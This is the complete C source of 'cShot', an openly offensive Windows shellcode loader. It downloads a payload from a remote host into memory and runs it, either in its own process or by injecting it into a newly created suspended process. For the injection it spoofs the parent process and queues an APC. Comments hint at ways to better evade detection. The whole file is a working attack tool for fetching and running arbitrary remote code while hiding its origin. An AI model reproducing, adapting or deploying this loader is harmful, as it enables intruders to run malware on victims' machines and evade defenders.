#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winhttp.h>
#include <string.h>
#include <TlHelp32.h>

#pragma comment(lib, "winhttp.lib")

//Store byte length of download
long sc_len;

//Fill buf with data from request, return new size of the buf
void readfromreq(char** buf, long iSize, HINTERNET con) {
	DWORD gatesMagic;
	long toRead = 0;
	if (!WinHttpQueryDataAvailable(con, &toRead))
		printf("[-] Error %u in checking bytes left\n", GetLastError());

	if (toRead == 0) {
		sc_len = iSize;
		printf("[+] Read %d bytes\n", iSize);
		return;
	}

	printf("[+] Current size: %d, To Read: %d\n", iSize, toRead);

	//If null create buffer of bytes to read
	if (*buf == NULL) {
		*buf = (char*)malloc(toRead + 1);
		ZeroMemory(*buf, toRead + 1);
	}//If does exist we want to make buffer bigger not create a new one
	else {
		*buf = (char*)realloc(*buf, iSize + toRead + 1);
		ZeroMemory(*buf + iSize, toRead + 1);
	}
	//Reading contents into the buffer with error checking
	if (!WinHttpReadData(con, (LPVOID)(*buf + iSize), toRead, &gatesMagic)) {
		printf("[-] Error %u in WinHttpReadData.\n", GetLastError());
	}

	readfromreq(buf, iSize + toRead, con);
}

//Make web request
char* dohttpreq(LPCWSTR addr, INTERNET_PORT port, LPCWSTR target, char* http) {
	BOOL  bResults = FALSE;
	HINTERNET hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	char* out = NULL;

	//Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"cshot/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);//Hmmm, cshot/1.0 seems odd.  I would look into that ;)

	//Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, addr, port, 0);

	//Create an HTTP Request handle
	if (hConnect)
	{
		hRequest = WinHttpOpenRequest(hConnect, L"GET",
			target,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			strcmp(http, "http") == 0 ? NULL : WINHTTP_FLAG_SECURE);//WINHTTP_FLAG_SECURE makes secure connection
	}
	else {
		printf("[-] Failed to connect to server\n");
	}

	//Send a Request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	else {
		printf("[-] Failed to connect to server\n");
	}

	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	else
		printf("[-] Error %d has occurred.\n", GetLastError());

	if (bResults) {
		printf("[+] About to fill buffer\n");
		readfromreq(&out, 0, hRequest);
	}
	else
		printf("[-] Error %d has occurred.\n", GetLastError());

	//Close open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	printf("[+] Finished reading file\n");

	return out;
}

//Get parent process ID - PPID spoofing code referenced/modified from https://github.com/hlldz/APC-PPID
DWORD getPPID(wchar_t* parentProcess) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process)) {
		do {
			if (!wcscmp(process.szExeFile, parentProcess))
				break;
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return process.th32ProcessID;
}

int main(int argc, char** argv) {
	setbuf(stdout, NULL);

	if (argc == 1) {
		char banner[] = "\n[+] cShot 1.0 - AnthemToTheEgo\n[+] For syntax examples visit https://github.com/anthemtotheego/cShot \n";
		printf("%s\n", banner);
		return 0;
	}

	//Variables
	char* token;
	char* http_https;
	char* fqdn_ip;
	char* url;
	BOOL success;
	DWORD dummy = 0;

	//Splits command at deliminator
	http_https = strtok_s(argv[1], "://", &token);
	fqdn_ip = strtok_s(NULL, "/", &token);
	url = strtok_s(NULL, " ", &token);

	//Converts arg to wide chars
	size_t convertedChars = 0;
	size_t wideSize = strlen(fqdn_ip) + 1;
	wchar_t* addr = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
	mbstowcs_s(&convertedChars, addr, wideSize, fqdn_ip, _TRUNCATE);

	wideSize = strlen(url) + 1;
	wchar_t* target = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
	mbstowcs_s(&convertedChars, target, wideSize, url, _TRUNCATE);

	printf("\n[+] Attempting to connect to site %s on port %s\n", argv[1], argv[2]);

	//Connect and download target bin into memory
	char* sc = dohttpreq(addr, atoi(argv[2]), target, http_https);

	if (argc == 3) {//Inject into own process
		printf("[+] Injecting shellcode into own process\n");

		//Mark as executable
		success = VirtualProtect(sc, sc_len, PAGE_EXECUTE_READWRITE, &dummy);//I would look into changing this if I were you ;)
		if (success == 0)
		{
			printf("[-] VirtualProtect error = %u\n", GetLastError());
			return 0;
		}
		//Execute
		printf("[+] Executing...\n");
		((void(*)())sc)();
	}
	else if (argc >= 5) {//Inject into other process
		printf("[+] Spoofing parent process %s\n", argv[3]);

		STARTUPINFOEXA sInfoEX;
		PROCESS_INFORMATION pInfo;
		SIZE_T sizeT;

		//Convert to wide char
		wideSize = strlen(argv[3]) + 1;
		wchar_t* parentProcess = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
		mbstowcs_s(&convertedChars, parentProcess, wideSize, argv[3], _TRUNCATE);

		//Open parent process
		HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, getPPID(parentProcess));

		ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
		InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
		sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
		InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
		UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
		sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);

		//Open child process
		printf("[+] Opening child process %s with commandline arguments %s\n", argv[4], argv[5]);
		success = CreateProcessA((LPCSTR)argv[4], (LPCSTR)argv[5], NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)(&sInfoEX), &pInfo);
		if (success == 0)
		{
			printf("[-] createProcess error = %u\n", GetLastError());
		}
		//Inject code
		printf("[+] Writing shellcode into child process %s\n", argv[4]);
		LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, sc_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);//I would look into changing this if I were you ;)
		SIZE_T* lpNumberOfBytesWritten = 0;
		success = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)sc, sc_len, lpNumberOfBytesWritten);
		if (success == 0)
		{
			printf("[-] WrieProcessMemory error = %u\n", GetLastError());
		}
		//Execute
		printf("[+] Executing shellcode...\n");
		QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
		ResumeThread(pInfo.hThread);
		CloseHandle(pInfo.hThread);
	}
	return 0;
}